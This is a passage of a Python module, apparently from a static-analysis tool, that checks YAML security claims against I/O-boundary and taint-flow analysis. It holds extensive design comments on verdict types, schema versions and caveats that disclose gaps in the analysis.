# SPDX-License-Identifier: AGPL-3.0-or-later
"""Security claim verification against I/O boundary and taint-flow analysis.

Loads security claims from a YAML file, checks each claim against either the
boundary map (ADR-0016) or taint-flow results (ADR-0017), and returns verdicts.

Claim Format
------------
A claims file has three permitted top-level keys (``_ALLOWED_TOP_LEVEL_KEYS``):

- ``claims``: the claim list, described below.
- ``extra_catalogs``: project-local taint/IO catalogue paths (``sources``,
  ``sinks``, ``sanitizers``, ``io_primitives``) that travel with the
  repository. Relative paths resolve against the claims-file directory.
  Loaded by ``load_extra_catalog_paths``.
- ``analysis_scope``: opt-in denominator narrowing. ``shipped_artifact``
  restricts nodes and edges to the packaged source roots derived from
  ``pyproject.toml`` files, so repo tooling does not have to be adjudicated
  to prove a claim about the shipped artifact. Loaded by
  ``load_analysis_scope`` / ``shipped_artifact_roots``.

Each claim in ``claims`` specifies:

- ``id``: Unique identifier (e.g., SC-001)
- ``text``: Human-readable description of the security property
- ``constraint``: What to check — one of:

  **Boundary constraint** (ADR-0016):
  - ``boundary``: Which I/O boundary type to check (e.g., "net_send")
  - ``must_not_exist``: If true, the boundary must have zero chains
  - ``max_chains``: Maximum allowed chain count for the boundary

  **Taint-flow constraint** (ADR-0017):
  - ``taint_flow``: Sub-object with taint-flow verification parameters
    - ``source_taint``: Taint label that must not reach the sink zone
    - ``prohibited_sink_zone``: Zone where tainted data must not arrive
    - ``allowed_sanitizers``: List of sanitizer qualified names (optional)

Verdict Types
-------------
- ``confirmed``: Claim was actively checked and held (no violations found)
- ``confirmed_with_caveats``: Clean, but the clean answer rests on something
  the reader must see — a sanitizer supplied by the analysed repository, or
  named opaque launch sites. Carries a structured ``caveats`` list and exits
  **3** (ADR-0016 §4). A consumer testing ``verdict == "confirmed"`` will not
  see these; use ``CONFIRMING_VERDICTS``.
- ``violated``: Specific evidence contradicts the claim
- ``inconclusive``: Verification couldn't proceed or couldn't be trusted —
  no machine-checkable constraint, broken input, missing catalog, or the
  I/O analysis was blind to the relevant code (empty analysis, or a
  supported language that produced no call edges). Kept distinct from
  ``confirmed`` to close the silent-confirm fall-through (ADR-0033 Phase 3;
  WI-kajil / INV-bitig).

For taint-flow claims the adjudication travels with the verdict rather than
being asserted by this module. Structural analysis produces ``approximate``
confidence; the ADR-0017 §3a data-dependence walk produces ``precise`` where it
confirms a dependence and ``approximate`` / ``ddg_mixed`` where it ran without
confirming one. A verdict's ``analysis_methods`` breakdown and each evidence
row's ``confidence`` / ``analysis_method`` report what actually happened. This
module previously hardcoded the literal ``approximate`` into every violated
verdict, which made a ``precise`` finding indistinguishable from a structural
one at the only surface a user reads.

Load-time validation
---------------------
``load_claims`` validates the claims file before constructing any ``Claim``
(the META-jurig gate): malformed YAML, an unexpected root/claim/constraint
shape, an unknown field name, or a ``constraint.boundary`` outside the
io-boundaries vocabulary each raise :class:`ClaimsFileError` (→ CLI exit 2)
rather than tracebacking or silently producing a degraded verdict stream.
``validate_taint_flow_vocabulary`` extends the same discipline to the taint
half (INV-todas): an unresolvable ``source_taint`` or ``prohibited_sink_zone``
raises rather than producing a claim that can never match anything and would
therefore report clean.

Caveats
-------
A ``confirmed_with_caveats`` verdict carries a structured ``caveats`` list,
built through one shared constructor so the text and JSON renderers disclose
identically. Four kinds exist:

- ``CAVEAT_USER_SUPPLIED_SANITIZER`` — the clean answer depends on a
  sanitizer declared by the analysed repository rather than the shipped
  catalogue. A shipped-catalogue sanitizer earns plain ``confirmed``.
- ``CAVEAT_OPAQUE_BOUNDARY`` — named launch sites whose callee cannot be
  resolved. This qualifies the verdict only when opacity is the *sole*
  remaining blocker; beside an uncatalogued module the verdict stays
  ``inconclusive``, because the reader could not tell which gap produced
  the silence.
- ``CAVEAT_DISPLACED_SHIPPED_ENTRY`` — a repo-supplied catalogue row
  replaced a shipped row, so the analysis ran against a catalogue the
  repository itself controls.
- ``CAVEAT_UNTYPED_RECEIVER`` — named call sites reaching a method the
  catalogue declares for *this* boundary, through a receiver whose type the
  analysis could not determine (INV-fibis). Boundary-scoped, and it does NOT
  make coverage incomplete: it qualifies a verdict that is otherwise clean.
  **Boundary claims only.** The taint arm has its own coverage gate and does
  not consume this signal; whether a taint verdict should disclose the same
  population is a separate question and is not answered here.

A verdict may carry more than one kind at once.

How It Works
------------
1. ``load_claims(path)`` validates and parses the YAML into ``Claim`` objects
2. ``verify_claim(claim, boundary_map)`` checks one claim → ``ClaimVerdict``
3. ``verify_taint_claim(claim, findings)`` checks taint-flow → ``ClaimVerdict``
4. ``verify_claims(claims, boundary_map, findings)`` checks all
"""
from __future__ import annotations

from collections.abc import Iterator, Mapping, Sequence, Set as AbstractSet
from dataclasses import dataclass, field
from pathlib import Path
from typing import TYPE_CHECKING, Any, Optional

if TYPE_CHECKING:
    from .taint import TaintFlowFinding

import yaml

from .axis_meta_keys import call_family_edge_types
from .edge_types import is_grpc_rpc_implementation
from .io_boundary import (
    KNOWN_IO_BOUNDARIES,
    PRODUCER_OPAQUE_BOUNDARIES,
    BoundaryMap,
    IoBoundaryCatalog,
    classify_call,
    is_definitionally_first_party,
    module_hint_disjuncts,
    normalize_module_separators,
)
from .ir import symbol_name_slot, symbol_path_slot
from .paths import classify_test_file, is_migration_file


# Schema version for the ``verify-claims --json`` envelope (WI-nulot / INV-gatog).
# 1.0 introduces the top-level object (schema_version + view + verdicts +
# unsupported_taint_languages) replacing the legacy bare JSON array.
# 1.2 adds the per-verdict ``excluded_flows`` disclosure bucket (WI-bifob).
# Additive: every 1.1 key keeps its meaning, and the new key is an empty dict
# when nothing was excluded, so a 1.1 consumer that ignores it still reads a
# correct verdict — but it would UNDERSTATE what the analysis saw, which is
# why this is a version change rather than a silent field addition.
# 1.3 adds the per-verdict ``flow_origins`` breakdown and a per-evidence-row
# ``source_boundary`` (WI-vazal). Also additive, and deliberately so: the
# alternative considered was RELABELLING database reads away from
# ``untrusted_input``, which would have been a silent semantic change to every
# claim already written against that label. Reporting the split instead means
# no published claim changes meaning and no verdict moves.
# 1.4 adds the per-verdict ``analysis_methods`` breakdown and a per-evidence-row
# ``confidence`` / ``analysis_method`` (INV-karud clause c). Additive, and a
# version change rather than a silent field addition for the same reason 1.2
# was: a 1.3 consumer reading a violated verdict cannot tell a flow the
# ADR-0017 §3a walk confirmed by data dependence from one included by call
# reachability alone, and will keep treating every flow as equally supported.
# This release also stops hardcoding the string ``approximate`` into every
# violated verdict's ``details`` — that literal made the label unobservable
# from BOTH surfaces at once, so no consumer could have noticed the difference.
# 1.5 SPLITS the ``excluded_flows`` bucket keys by which rule fired. NOT purely
# additive, and that is the point: a flow formerly counted under
# ``test_sourced`` may now appear under ``benchmark_sourced`` /
# ``fixture_sourced`` / ``mock_sourced`` / ``test_support_sourced``. Which
# flows are excluded does not change at all — ``paths.classify_test_file`` IS
# ``is_test_file``, the boolean being defined as "reason is not None" — only
# what they are called. A 1.4 consumer summing the dict still gets the right
# total; one keyed on the literal ``test_sourced`` now sees only genuine test
# code, which is what that key always claimed to mean. This release also
# splices ``excluded_flows`` and ``flow_origins`` into the VIOLATED path's
# ``details``, closing WI-bifob's stated but unimplemented contract that
# exclusions are disclosed on both paths.
# 1.6 adds the per-verdict ``sanitized_flows`` count. Sanitized flows now EXIST
# — the propagators emit them labelled instead of pruning them into silence, so
# ``TaintFlowFinding.sanitized`` stops being written ``False`` at every
# construction site and ``verify_taint_claim``'s ``and not f.sanitized`` stops
# being a tautology. Additive: a verdict with no sanitizer on any route reports
# 0, exactly as before. No verdict moves — a sanitized flow was already not
# counted, it was merely not COUNTABLE.
# 1.7 adds the top-level ``dataflow_coverage`` block (INV-karud clause a3):
# per-language data-flow capability with the catalog it would serve, a
# findings-by-analysis-method rollup, and ``inclusion_decided_by``. Additive.
# The block answers a question no per-flow field can: ``analysis_method`` says
# how ONE flow was adjudicated, and a reader cannot interpret "structural"
# without knowing whether the language was capable of anything else.
# 1.8 nests ``sanitizer_scope`` inside that block (INV-karud clause b): the
# catalogue's size, the taint categories it can express, the labels a flow must
# carry to be reportable as sanitized at all, and ``same_function_honoured_by``.
# Additive, and it exists because clause (b)'s evidence is unreadable without
# it — the catalogue is entirely cryptographic, so a repository-wide "0
# sanitized flows" usually means the claims' labels and the sanitizers' labels
# are disjoint sets rather than that nothing was protected. It also publishes
# the one shape the call-graph pass structurally cannot honour: a sanitizer
# called in the same function as the source (WI-fasub), which the DDG pass now
# does honour and which every language without a def/use extractor still misses.
# 2.0 adds the ``confirmed_with_caveats`` verdict value and the per-verdict
# ``caveats`` list (INV-pojib b/c). NOT additive, and called out as the one
# breaking bump in this list: a consumer testing ``verdict == "confirmed"``
# stops seeing a claim it used to see, and the CLI grows exit code 3. That is
# the point rather than a side effect — remedy (a1) put the repo-supplied
# sanitizer in the verdict PROSE, and a CI gate reads neither prose nor JSON
# details, so the fact stayed invisible to the only consumer that matters.
#
# A NEW CAVEAT *KIND* DOES NOT BUMP THIS, and the rule is worth stating because
# two have arrived since 2.0 without one (``displaced_shipped_entry``,
# INV-faput; ``untyped_receiver``, INV-fibis). The shape a consumer parses is
# unchanged — a list of objects each carrying AT LEAST ``kind`` / ``entries`` /
# ``detail``, which a consumer already had to tolerate unknown members of, since
# the kinds present depend on the repo analysed and not on the version. A kind
# may carry an extra key beside those three (``untyped_receiver`` carries the
# ``boundary`` it was scoped to, so a merge can re-render its prose); that is
# additive within the object and invisible to a consumer reading the three.
# What DOES change is which claims are caveated at all, and that is a
# BEHAVIOURAL change disclosed in the changelog rather than a schema one. The
# version moves when the ENVELOPE moves.
#
# 2.2 adds the per-verdict ``analysis_fidelity`` map — language -> the pass IDs
# that produced the CALL edges this verdict rests on (WI-lagod). Additive: a 2.1
# consumer ignoring it still reads a correct verdict. It is a version change and
# not a silent field addition because without it a verdict cannot be compared
# across runs at all: two runs over one Rust crate differing ONLY in backend
# produced a BYTE-IDENTICAL verdict block while one carried 10 ``origin=scip``
# nodes and the other zero, so a reader holding the output could not tell which
# analyzer had spoken. This is the second half of the owner's 2026-08-23 bar —
# "name what it could not examine, AND AT WHAT ANALYSIS FIDELITY".
#
# NOT ``analysis_methods``, which already exists and records how the taint walk
# REASONED (``ddg`` / ``ddg_mixed`` / ``structural``). A ``structural`` verdict
# and a tree-sitter verdict are different facts; widening that key into this one
# would put two concepts under one name.
#
# 2.1 makes a violated verdict's evidence row a SITUATION rather than a
# source->sink pair wherever the pair was not adjudicated (INV-karud), and adds
# ``source_primitives`` / ``sink_primitives`` / ``sink_symbols`` /
# ``collapsed_flow_count`` to every row. NOT purely additive, and like 1.5 that
# is the point: ``evidence_count`` and the ``details`` count now report
# situations, so a 2.0 consumer tracking a row total sees it fall (measured
# 359 -> 80 across six repositories) WITHOUT any verdict moving and without any
# (source symbol, source primitive, sink primitive, sink symbol) tuple being
# dropped. The old quantity is still available: ``details`` carries a
# ``spanning N source->sink pair(s)`` clause and every row carries
# ``collapsed_flow_count``. The witness scalars keep their names and stay
# valid — each is a member of its own set — so a consumer reading
# ``sink_primitive`` reads one of the primitives the row names rather than a
# field that vanished.
VERIFY_CLAIMS_SCHEMA_VERSION = "2.2"

#: Verdict values that ASSERT THE CLAIM HOLDS. The one predicate for "did this
#: claim pass", consumed by the coverage gate, the CLI's exit code and the CLI's
#: summary counter alike.
#:
#: This exists because adding a fourth verdict value is exactly the change that
#: punches holes in ``!= "confirmed"`` tests scattered across consumers. The
#: honesty gate (:func:`_require_coverage_to_confirm`) is the one that matters:
#: had it kept testing ``!= "confirmed"``, a blind analysis would have returned
#: ``confirmed_with_caveats`` instead of ``inconclusive`` and this change would
#: have quietly widened the false-confirm class INV-bitig / INV-javam closed.
#: ``test_blindness_still_dominates_a_caveated_verdict`` pins that direction.
CONFIRMING_VERDICTS: frozenset[str] = frozenset({
    "confirmed",
    "confirmed_with_caveats",
})

#: Caveat kind: a sanitizer the ANALYSED REPOSITORY supplied is credited with
#: removing a flow that would otherwise have been reported. The tool cannot
#: check that assertion — it takes the repository's word that the named
#: function neutralises the taint — so the verdict rests on an input rather
#: than on the analysis.
#:
#: SCOPE, STATED SO THIS DOES NOT READ AS THE CLASS CLOSED. This covers the
#: SANITIZER channel only. There is a SECOND, measured channel it does not
#: cover: user sources and sinks merge through ``_merge_with_user_override``,
#: where an entry matching a shipped one on ``(module, name, kind)`` REPLACES
#: it, while sanitizers merely ``.extend()``. Measured — a user sink
#: re-declaring ``pathlib.Path`` / ``write_text`` out of the ``host_fs`` zone
#: takes a real ``violated`` rc 1 to ``confirmed`` rc 0, by both the
#: ``--taint-sinks`` flag and the in-tree ``extra_catalogs:`` route, and NO
#: caveat is raised. It cannot be: the shipped sink is filtered out of the
#: catalogue, so the flow is never constructed and there is no finding to
#: attribute. Detecting it means diffing the merged catalogue against the
#: shipped one — catalogue-level machinery rather than the finding-level
#: attribution here — which is why it is filed rather than bundled.
CAVEAT_USER_SUPPLIED_SANITIZER = "user_supplied_sanitizer"

#: Caveat kind: the claim held everywhere the analysis could see, and control
#: leaves the process at one or more NAMED call sites whose launched program is
#: not in the edge set. ADR-0016 §4's ORIGINAL specified consumer of the fourth
#: verdict — "consistent, but opaque boundaries exist that could not be
#: verified" — implemented 2026-08-13 on the machinery INV-pojib built.
#:
#: WHY THIS IS NOT ``inconclusive``. That verdict conflated two states: "a whole
#: language here has no catalogue, I am blind" and "I examined every call and
#: understood them all; three hand control to git/pip/rustup and no static tool
#: can see inside a launched process". The auditor distinction is exact — a
#: DISCLAIMER versus a QUALIFIED OPINION — and because hypergumbo launches
#: programs BY DESIGN, ``confirmed`` was permanently unreachable for its own
#: self-proof, making that artifact one that could never say anything.
#:
#: THE DIRECTION IS TOWARDS CONFIRMING, so its soundness rests entirely on the
#: launch list being COMPLETE. That is why it ships only after the surface was
#: hardened: constructors counted (INV-motos), opacity gated (INV-gahuz),
#: producer stamps unerasable (INV-larol, INV-virat), row-order masking closed
#: (INV-zumin). Raised ONLY when launches are the sole remaining blocker
#: (:attr:`BoundaryCoverage.qualifying_only`).
#:
#: THE WORDING SAYS "could not see INSIDE these launched programs" rather than
#: anything implying full coverage, because "I saw every call" is not "I saw
#: every I/O" — INV-vavup measured bash redirection writes emitting no edge at
#: all.
CAVEAT_OPAQUE_BOUNDARY = "opaque_boundary"

#: Caveat kind: a catalogue entry the tool ships was REPLACED by one the
#: analysed repository supplied, and the replaced entry is exactly the kind of
#: entry that could have produced evidence for THIS claim.
#:
#: INV-faput. User sources/sinks merge via ``_merge_with_user_override``, where
#: a matching (module, name, kind) does not ADD to the catalogue — it FILTERS
#: OUT the shipped row. Measured on the shipped CLI: a repo whose only
#: statement is ``os.remove(os.environ["API_KEY"])``, against "host secrets
#: must not reach the host filesystem", goes ``violated`` rc 1 -> ``confirmed``
#: rc 0 when a user file re-declares ``os.remove`` into a ``dev_zone``, with
#: ``caveats: []``. Both routes reproduce: the ``--taint-sinks`` flag and the
#: in-tree ``extra_catalogs:`` block, which needs no flag from whoever runs the
#: tool.
#:
#: STRICTLY STRONGER THAN THE TWO GAPS ALREADY CLOSED, on the same argument
#: that made INV-pojib worth doing. An overlay GRANTS coverage. A user
#: sanitizer DELETES a finding already made, and is attributed on the flow. An
#: override PREVENTS THE FINDING FROM EXISTING — the only one of the three that
#: can leave no trace on any per-flow record, because the sink is gone from the
#: catalogue before propagation runs. INV-pojib's finding-level attribution
#: structurally cannot see it: there is no finding to attribute, nothing is
#: sanitized, and ``caveats`` is *correctly* empty.
#:
#: RAISED ONLY WHERE IT DISCRIMINATES, the same rule the sanitizer caveat
#: follows. A displaced sink whose shipped zone is not this claim's prohibited
#: zone could not have produced evidence for this claim, and reporting it would
#: be noise on every run of a repo that customises its catalogue at all. And a
#: user row moving a sink INTO the prohibited zone ADDS findings — it needs no
#: caveat, which is why the test is zone equality and not "a user row exists".
#:
#: THE RUN-LEVEL DISCLOSURE WAS ALREADY THERE AND IS NOT ENOUGH:
#: ``catalog_provenance`` names the file and sets ``user_supplied: true``, so
#: the run says "a user catalogue was used". It does not say "and it removed
#: the sink that would have caught this claim", and the VERDICT — the machine
#: surface a consumer branches on — was byte-identical to an honest confirm.
CAVEAT_DISPLACED_SHIPPED_ENTRY = "displaced_shipped_entry"

#: Caveat kind: the claim held everywhere the analysis could see, and one or
#: more NAMED call sites reach a method the catalogue declares for THIS
#: boundary through a receiver whose type the analysis could not determine.
#:
#: INV-fibis. Reproduced on the shipped CLI with a two-arm control, stdlib
#: only, no overlay and no opaque launch::
#:
#:     def send_unannotated(sock, payload):          # ARM 1
#:         return sock.sendall(payload)
#:     def send_annotated(sock: socket.socket, ...): # ARM 2
#:         return sock.sendall(payload)
#:
#: ARM 2 reports ``violated``; ARM 1 reported **confirmed** — "This service
#: never sends data over the network" — about a function whose entire body is a
#: network send, while the ``fs_read`` control fired ``violated`` in BOTH arms,
#: so the null was not a broken run.
#:
#: WHY THIS IS NOT A COVERAGE FAILURE. ``_uncatalogued_external_modules``
#: counts only a dst that NAMES a module; ARM 1's edge is the bare placeholder
#: ``python:external:0-0:sendall:external_symbol``, which names none. That skip
#: is deliberate and is UNCHANGED — the placeholder is the largest edge
#: population in a Python repo and identifies no library to report, so counting
#: it as an uncatalogued module downgrades nearly every repo to
#: ``inconclusive`` while telling the reader nothing, which is the outcome
#: PR #251 already rejected. ``compute_boundary_coverage`` still returns
#: ``complete=True`` here.
#:
#: SO THE FIX IS AT THE VERDICT, AND IT IS THE SIBLING ARGUMENT ONE STEP OVER.
#: :data:`CAVEAT_OPAQUE_BOUNDARY`'s own note draws the auditor distinction — a
#: DISCLAIMER ("a whole language here has no catalogue, I am blind") versus a
#: QUALIFIED OPINION ("I examined every call and understood them all; three
#: hand control to git and no static tool can see inside"). "I saw this call, I
#: know ``sendall`` is a catalogued ``net_send`` method, and I could not
#: determine the receiver's type" is a qualified opinion by the same test.
#:
#: BOUNDARY-SCOPED, AND THAT IS WHAT MAKES IT SHIPPABLE. A DOWNGRADE on this
#: signal was measured on 2026-08-11 and recorded DO NOT BUILD IT: on poetry
#: every boundary would have downgraded (db_read 234, ipc_recv 160, fs_read 93,
#: fs_write 67, db_write 40, net_send 37, net_recv 35, ipc_send 1), because the
#: catalogued method names include ``close`` / ``get`` / ``read`` / ``write`` /
#: ``send`` — the most common method names in Python. Two things answer that
#: measurement rather than ignore it: the verdict is QUALIFIED rather than
#: WITHHELD, and a name is matched only against primitives catalogued for the
#: CLAIMED boundary, so that measurement's own example — an unrelated dict
#: ``.get`` — cannot touch a ``net_send`` verdict at all.
#:
#: THE OTHER HALF OF THAT REFUTATION IS NOT CITED HERE BECAUSE IT DOES NOT
#: SURVIVE. It also called the signal "anti-correlated with the truth", arguing
#: from ``session.post`` — a primitive absent from the catalogue entirely
#: (INV-fotav's third-party gap), not one reached through an untyped receiver.
#:
#: METHOD-KIND ONLY. A bare ``open()`` has no receiver, so "I could not type the
#: receiver" is not a true sentence about it; matching function-kind rows would
#: make the disclosure false on its own evidence.
#:
#: WHAT IT DOES NOT DO: make the flow VISIBLE. Typing the receiver
#: interprocedurally is the sound recall fix (INV-linub L3) and stays sequenced
#: behind precision by measurement 0001's ``<50%`` band. This makes the VERDICT
#: honest; it does not make the analysis see further.
CAVEAT_UNTYPED_RECEIVER = "untyped_receiver"

#: A clean boundary verdict is CLOSED-WORLD over the receivers the analysis could
#: type, and this says so with a count and a denominator (INV-fibis, unscoped half).
#:
#: WHY ``CAVEAT_UNTYPED_RECEIVER`` DOES NOT COVER THIS, measured rather than
#: argued. That caveat matches the called method's NAME against primitives
#: catalogued for the claimed boundary — and a name lookup is exactly what an
#: untyped receiver makes meaningless. A corpus hunt over 32,593 non-test files
#: found 90 real scopes whose untyped receiver calls a genuine I/O verb outside
#: the 120 catalogued method-kind names (``post`` 56, ``upload_file`` 6,
#: ``upload`` 6, ``put_item``/``get_item`` 6, ``download_file`` 5,
#: ``execute_command`` 3). The boundary-scoped caveat fired on ZERO of them. All
#: 90 were protected by a COVERAGE GAP instead (68 uncatalogued-module, 13
#: opaque-launch, 5 unsupported-language) — every one of which the project
#: intends to close, so the protection SHRINKS as the tool improves.
#:
#: Demonstrated end-to-end on unmodified real code: polis
#: ``deploy-static-assets.py`` uploads to S3 through
#: ``s3_client.upload_file(...)`` where ``s3_client`` is an unannotated
#: parameter. With a realistic project overlay auditing ``boto3`` but omitting
#: ``upload_file`` from its rows, the shipped CLI returned rc 0 and "never sends
#: data over the network: confirmed".
#:
#: WHY THIS IS NOT THE DOWNGRADE REFUSED ON 2026-08-11. That proposal WITHHELD
#: the verdict (``inconclusive`` on every boundary of every repo). This one
#: QUALIFIES it: the verdict still reads clean, the exit code moves 0 -> 3, and
#: the sentence carries a COUNT AND A DENOMINATOR so a reader can size the
#: unknown rather than only be told one exists. It is capable of NOT firing —
#: an analysis whose receivers are all typed keeps a bare ``confirmed``, which
#: ``test_all_typed_receivers_stays_bare_confirmed`` pins, because a caveat that
#: is always there is discounted by its reader (the lesson
#: :func:`_repo_supplied_sanitizer_caveat` already records).
#:
#: NOT MERGEABLE, and that is why it is absent from :func:`_merge_caveat`'s
#: re-render branch: its counts are computed ONCE over the whole analysis in
#: :func:`unknown_receiver_scope`, so a second writer with a different slice of
#: the same population cannot exist. The kinds in that branch are the ones a
#: second writer CAN widen.
CAVEAT_UNKNOWN_RECEIVER_SCOPE = "unknown_receiver_scope"

#: A clean verdict rests on a language whose analyzer CANNOT SEE external
#: instance-method calls at all, declared rather than inferred
#: (:mod:`hypergumbo_core.analyzer_disclosure`; owner ruling 2026-08-23,
#: "declare the blindness").
#:
#: WHY ITS SIBLINGS DO NOT COVER THIS, and the distinction is the whole reason
#: it exists. ``CAVEAT_UNTYPED_RECEIVER`` and ``CAVEAT_UNKNOWN_RECEIVER_SCOPE``
#: both disclose an EDGE THE ANALYSIS EMITTED and could not adjudicate. kotlin
#: and javascript emit NO external instance-method call edge at all (WI-nasuf),
#: so both are silent by construction and the verdict came out a bare
#: ``confirmed`` over 232 catalogued method-kind sinks — kotlin 181 of its 186
#: primitives, javascript 51 of 187.
#:
#: THE EDGE SET CANNOT DISTINGUISH THE TWO CASES. "this repository contains no
#: external method calls" and "this analyzer never emits them" produce the same
#: empty set and opposite verdicts, so the fact is DECLARED with a date and a
#: measurement instead of being read off the data.
#:
#: A CAVEAT, NOT A WITHHOLD. Those languages do emit call edges, just not this
#: shape, so "I examined everything I could see, except this whole construct"
#: is the true sentence and is a QUALIFIED OPINION (ADR-0016 §4);
#: ``inconclusive`` would claim the analysis formed no view at all. The verdict
#: still reads clean and the exit code moves 0 -> 3.
#:
#: IT DISAPPEARS ON ITS OWN when WI-nasuf teaches those analyzers to emit the
#: edges: the declaration flips and no invariant changes colour. Under a
#: CAPABILITY-phrased bar the same commit would have read as a mass NEW
#: violation, which is LIVE.md rule 19 and the reason the bar was rewritten.
CAVEAT_ANALYZER_METHOD_CALL_BLIND = "analyzer_method_call_blind"

#: A clean verdict rests on a language whose analyzer DELIBERATELY declines to
#: model some method names, and the catalogue declares some of those names as
#: I/O sinks (INV-polad).
#:
#: THE SIBLING ABOVE IS ABOUT A WHOLE CONSTRUCT; THIS IS ABOUT NAMED METHODS,
#: and they are kept apart because the remedies differ. kotlin cannot see
#: external instance-method calls AT ALL and the fix is to build the edges
#: (WI-nasuf). rust sees them and drops a listed 77 by name to stop a name-only
#: resolution binding ``x.load()`` to a project ``JoltDevice::load`` (WI-bakak,
#: 22 of 29 false callers) — a policy that is CORRECT and stays. Collapsing the
#: two would suggest one fix for two different problems.
#:
#: NINE NAMES, TEN CATALOGUE ROWS, DERIVED NOT LISTED. ``send`` / ``write`` /
#: ``read`` / ``flush`` / ``recv`` / ``new`` / ``spawn`` / ``status`` /
#: ``output`` are each declared a method-kind sink by ``rust.yaml``
#: (``write`` twice, for ``io::Write`` and ``TcpStream``). The overlap is
#: computed from the shipped catalogue at render time, so adding a row for a
#: denylisted name extends the disclosure with nobody remembering to.
#:
#: WHY NOT JUST EMIT THE CALLS — measured, then rejected: as ordinary
#: unresolved-external edges they took total edges +33% / +67% and the external
#: population +115% / +207% on two real crates, because the same set holds
#: ``clone`` / ``unwrap`` / ``map``. Declaring the gap says the same true thing
#: for nothing.
CAVEAT_ANALYZER_SUPPRESSED_METHODS = "analyzer_suppressed_methods"

#: A higher-fidelity analyzer for a language in this repository is INSTALLED on
#: this machine and was not used (WI-lagod).
#:
#: THE REQUIREMENT THIS ANSWERS, in the ruling's own terms: a rust repository
#: analysed with rust-analyzer installed but NOT enabled produced a verdict
#: indistinguishable from one on a machine where no such backend exists, and a
#: reader would act differently on those two. ``analysis_fidelity`` says what
#: RAN; this says what COULD HAVE. They are separate because the first is a
#: statement about the run and the second about the machine, and only the
#: second can be acted on by turning something on.
#:
#: SCOPED TO UNUSED, NOT TO EXISTENCE. When the backend actually ran, its pass
#: ID appears in ``analysis_fidelity`` and this caveat does not fire — if it
#: fired either way, enabling the backend would leave the verdict looking just
#: as qualified and nobody would enable it.
CAVEAT_HIGHER_FIDELITY_AVAILABLE = "higher_fidelity_available"

#: Backend name (as a person types it at ``--backend``) -> the pass ID its
#: edges actually carry. Without this the "did it run?" check compares a
#: human-facing label against a producer stamp and answers no every time, so a
#: run WITH the backend on would still be told to turn it on.
_BACKEND_PASS_IDS: dict[str, str] = {"rust-analyzer": "scip"}


def _merge_caveat(
    existing: list[dict[str, Any]], new: dict[str, Any],
) -> list[dict[str, Any]]:
    """Add a caveat, or fold it into the entry that already carries its kind.

    APPEND FIXED ONE BUG AND INVITED ITS MIRROR. Switching from assign to
    append is what stopped a second writer erasing the first (INV-virat's
    class); doing it unguarded lets the SAME kind accumulate. Measured before
    this existed: a claims file holding both a boundary claim and a taint claim
    produced ``['opaque_boundary', 'opaque_boundary']`` on the boundary
    verdict, because ``verify_claim`` attaches the caveat and
    :func:`_require_coverage_to_confirm` then appends the taint arm's copy to
    the same verdict.

    Not cosmetic: ``caveats`` is the machine surface a consumer branches on and
    COUNTS, so a doubled entry says a claim rests on twice as many unverifiable
    doors as it does.

    THE UNION IS KEPT, NOT THE FIRST. If two paths ever disagree about which
    sites they saw, under-reporting unverifiable doors is the failure that
    matters; over-reporting is merely noisy. Entries stay sorted so the merged
    list is stable across runs and diffable.
    """
    for i, cav in enumerate(existing):
        if cav.get("kind") != new.get("kind"):
            continue
        merged_entries = sorted(
            set(cav.get("entries") or []) | set(new.get("entries") or [])
        )
        if merged_entries == list(cav.get("entries") or []):
            return existing
        rebuilt = dict(cav)
        rebuilt["entries"] = merged_entries
        # Re-render so the prose agrees with the widened entry list rather
        # than quoting a stale count — a disclosure whose sentence and whose
        # data disagree is worse than either alone. Only the kinds whose
        # SENTENCE quotes their entries appear here; the sanitizer and
        # displaced-entry kinds do not, so their merged prose is already true.
        # A fifth kind that quotes its entries must be added below or it will
        # silently keep a stale sentence.
        if new.get("kind") == CAVEAT_OPAQUE_BOUNDARY:
            rebuilt = _opaque_boundary_caveat(merged_entries)
        elif new.get("kind") == CAVEAT_UNTYPED_RECEIVER:
            rebuilt = _untyped_receiver_caveat(
                cav.get("boundary", ""), merged_entries,
                arm=cav.get("arm", _ARM_BOUNDARY),
            )
        return [*existing[:i], rebuilt, *existing[i + 1:]]
    return [*existing, new]


def _opaque_boundary_caveat(sites: list[str]) -> dict[str, Any]:
    """The one place the opaque-launch caveat is built, for both claim kinds.

    Boundary claims and taint claims reach this from different code paths, and
    two spellings of one disclosure would drift the first time either was
    edited — the failure this module has paid for repeatedly (L53). A parity
    test asserts both paths produce the same ``kind`` and the same site list.
    """
    shown = ", ".join(sites)
    return {
        "kind": CAVEAT_OPAQUE_BOUNDARY,
        "entries": list(sites),
        "detail": (
            f"The claim holds everywhere the analysis could see. Control "
            f"leaves this process at {len(sites)} call site(s) — {shown} — "
            f"and hypergumbo cannot see inside a launched program, so what "
            f"those programs do is not covered by this verdict."
        ),
    }


#: How many call sites to spell out in the untyped-receiver caveat before the
#: sentence switches to naming the distinct METHODS instead. Same value and same
#: reasoning as :data:`_MAX_REPORTED_UNCATALOGUED_MODULES` — a disclosure is read
#: by a human deciding whether to trust a verdict, and a wall is not read at all.
_MAX_REPORTED_UNTYPED_SITES = 5


#: Which verdict arm an ``untyped_receiver`` caveat was raised for. ONE caveat
#: KIND, TWO ARMS, because the fact is one fact — a catalogued method was called
#: on a receiver whose type the analysis could not determine — and a consumer
#: filtering on ``kind`` wants both. What differs is only WHICH catalogue
#: declares the method and WHAT the reader consequently does not know, so those
#: two clauses are selected here rather than by a second builder. Two spellings
#: of one disclosure drift the first time either is edited (L53), and this
#: module has paid for that repeatedly.
_ARM_BOUNDARY = "boundary"
_ARM_TAINT = "taint"

#: The noun for the catalogue that declares the method, per arm. A boundary
#: claim is adjudicated against the I/O primitive catalogue; a taint claim
#: against the SINK catalogue, which is a different document with a different
#: vocabulary (zones, not boundaries) and which a repository can extend with
#: ``--taint-sinks``.
_UNTYPED_SCOPE_NOUN = {
    _ARM_BOUNDARY: "catalogue",
    _ARM_TAINT: "sink catalogue",
}

#: What the reader does not know, per arm — the clause that makes the sentence
#: worth reading. The boundary question is whether the call performs the I/O at
#: all; the taint question presupposes that and asks whether tainted data
#: REACHES it, so a taint reader who was told only "we could not decide whether
#: this is I/O" would not learn that the FLOW is what went unbuilt.
_UNTYPED_CONSEQUENCE = {
    _ARM_BOUNDARY: (
        "so whether those calls perform this I/O was never decided"
    ),
    _ARM_TAINT: (
        "so a flow reaching that sink could neither be constructed nor "
        "ruled out"
    ),
}


def _untyped_receiver_caveat(
    boundary: str, sites: list[str], *, arm: str = _ARM_BOUNDARY,
) -> dict[str, Any]:
    """The one place the untyped-receiver disclosure is built.

    Same rule as :func:`_opaque_boundary_caveat` and for the same reason: two
